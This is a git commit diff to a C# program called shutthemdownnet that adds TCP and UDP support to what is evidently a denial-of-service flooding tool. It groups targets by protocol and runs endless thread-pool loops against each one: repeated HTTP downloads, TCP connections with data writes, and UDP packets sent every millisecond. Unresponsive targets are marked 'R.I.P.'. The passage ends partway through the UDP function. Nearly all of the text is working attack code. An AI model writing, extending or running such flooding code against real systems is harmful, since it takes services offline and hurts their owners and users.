3d84c5da9b9f2a900555e7ec01c63a00936875a0
GiveThemHell <givethemhell@github.com>
2022-03-08 15:42:11 -0500

    tcp/udp support

--- shutthemdownnet/Program.cs
+++ shutthemdownnet/Program.cs
@@ -1,9 +1,8 @@
-﻿
-
-using System.Net;
+﻿using System.Net;
 
 using System.Collections.Concurrent;
 using System.Diagnostics;
+using System.Net.Sockets;
 
 namespace DB
 {
@@ -60,11 +59,43 @@ namespace DB
             TimeSpan.Zero,
             TimeSpan.FromSeconds(1));
 
-            var task4s = new List<Task>();
-
-            foreach (var url in targets)
+            var protocols = targets.GroupBy(address =>
             {
-                ThreadPool.UnsafeQueueUserWorkItem((_) => Start(url, source.Token), false);
+                if (address.StartsWith("http"))
+                {
+                    return "http";
+                }
+
+                if (address.StartsWith("tcp"))
+                {
+                    return "tcp";
+                }
+
+                if (address.StartsWith("udp"))
+                {
+                    return "udp";
+                }
+
+                return "http";
+            });
+
+
+            var http = protocols.Single(group => group.Key == "http");
+            foreach (var url in http)
+            {
+                ThreadPool.UnsafeQueueUserWorkItem((_) => StartHTTP(url, source.Token), false);
+            }
+
+            var tcps = protocols.Single(group => group.Key == "tcp");
+            foreach (var url in tcps)
+            {
+                ThreadPool.UnsafeQueueUserWorkItem((_) => StartTCP(url, source.Token), false);
+            }
+
+            var udp = protocols.Single(group => group.Key == "udp");
+            foreach (var url in udp)
+            {
+                ThreadPool.UnsafeQueueUserWorkItem((_) => StartUDP(url, source.Token), false);
             }
 
             while (true) { }
@@ -74,7 +105,7 @@ namespace DB
             return 0;
         }
 
-        public static void Start(string url, CancellationToken token)
+        public static void StartHTTP(string url, CancellationToken token)
         {
             var client = new WebClient();
             client.Headers[HttpRequestHeader.UserAgent] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2";
@@ -87,6 +118,124 @@ namespace DB
                 {
                     stopWatch.Restart();
                     client.DownloadString(url);
+                }
+
+                catch (Exception ex)
+                {
+                    isDead = true;
+                    Thread.Sleep(TimeSpan.FromSeconds(5));
+                }
+
+                finally
+                {
+                    stopWatch.Stop();
+                }
+
+                var res = isDead ? "R.I.P. " + stopWatch.Elapsed.ToString() : stopWatch.Elapsed.ToString();
+
+                results.AddOrUpdate(url, res, (_, _1) => res);
+            }
+            results.Remove(url, out string val);
+        }
+
+        public static void StartTCP(string url, CancellationToken token)
+        {
+            var stopWatch = new Stopwatch();
+
+            url = url.Substring("tcp://".Length);
+            var parts = url.Split(":");
+            if (parts.Length != 2)
+            {
+                Console.Error.WriteLine($"Cannot parse url ${url}");
+                return;
+            }
+
+            var data = System.Text.Encoding.ASCII.GetBytes("test");
+
+            string address = null;
+            int port = 0;
+
+            try
+            {
+                address = parts[0];
+                port = int.Parse(parts[1]);
+            }
+            catch (Exception ex)
+            {
+                Console.Error.WriteLine($"Cannot parse url ${url}, ${ex.ToString()}");
+                return;
+            }
+
+            while (!token.IsCancellationRequested)
+            {
+                var isDead = false;
+                try
+                {
+                    stopWatch.Restart();
+                    //-----
+                    var client = new TcpClient(address, port);
+                    using (var stream = client.GetStream())
+                    { 
+                        stream.Write(data, 0, data.Length);
+                    }
+                }
+
+                catch (Exception ex)
+                {
+                    isDead = true;
+                    Thread.Sleep(TimeSpan.FromSeconds(5));
+                }
+
+                finally
+                {
+                    stopWatch.Stop();
+                }
+
+                var res = isDead ? "R.I.P. " + stopWatch.Elapsed.ToString() : stopWatch.Elapsed.ToString();
+
+                results.AddOrUpdate(url, res, (_, _1) => res);
+            }
+            results.Remove(url, out string val);
+        }
+
+        public static void StartUDP(string url, CancellationToken token)
+        {
+            var stopWatch = new Stopwatch();
+
+            url = url.Substring("udp://".Length);
+            var parts = url.Split(":");
+            if (parts.Length != 2)
+            {
+                Console.Error.WriteLine($"Cannot parse url ${url}");
+                return;
+            }
+
+            var data = System.Text.Encoding.ASCII.GetBytes("test");
+
+            string address = null;
+            int port = 0;
+
+            try
+            {
+                address = parts[0];
+                port = int.Parse(parts[1]);
+            }
+            catch (Exception ex)
+            {
+                Console.Error.WriteLine($"Cannot parse url ${url}, ${ex.ToString()}");
+                return;
+            }
+
+            while (!token.IsCancellationRequested)
+            {
+                var isDead = false;
+                try
+                {
+                    stopWatch.Restart();
+                    //-----
+                    var client = new UdpClient(address, port);
+                    var a = client.Send(data);
+                    Thread.Sleep(1);
                 }
 
                 catch (Exception ex)
